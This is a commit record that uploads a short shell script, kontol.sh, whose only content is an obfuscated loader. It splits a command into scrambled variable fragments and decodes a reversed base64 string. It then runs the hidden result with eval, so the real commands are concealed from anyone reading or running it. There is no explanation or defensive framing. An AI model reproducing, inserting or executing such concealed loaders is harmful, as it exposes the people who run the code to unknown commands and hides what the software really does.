a12ef10edadeabfbc35dc3a3938c2d590e9a39c8
yarrak68 <51958237+yarrak68@users.noreply.github.com>
2019-06-23 05:04:14 -0400

    Add files via upload

---
+++ kontol.sh
@@ -0,0 +1,4 @@
+gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '=ogCl52bkpQMgAXZlx2cgoQMm4jMgICbsVnbvYXZk9iIg4DIwVnLgg2chJGIKICd4RnLlxWam9Cdl5mLvVmdyV2cuQHanlGbhlmbv1mchh2LvoDc0RHaiAiI6BXduICIv1CIz1CIsJXdjBiCvR2OlVnc0BSZslGa3pgCpZmCi8WZtF2Yu8SRN9ESkICIiADJiAiZtACcjpwYyh2chJmLvUUTPhEJg4jPgAiImAybl1WYj5yLF10TIRCIoNXYiJCIvh2YlpQZzxWZKIiIg8GajVmCuVGa0ByOdBiIvVWbhNmLvUUTPhEJiAiZtAyWgYWa
+' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
+x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
+eval "$N0q$x$Hc2$rQW"
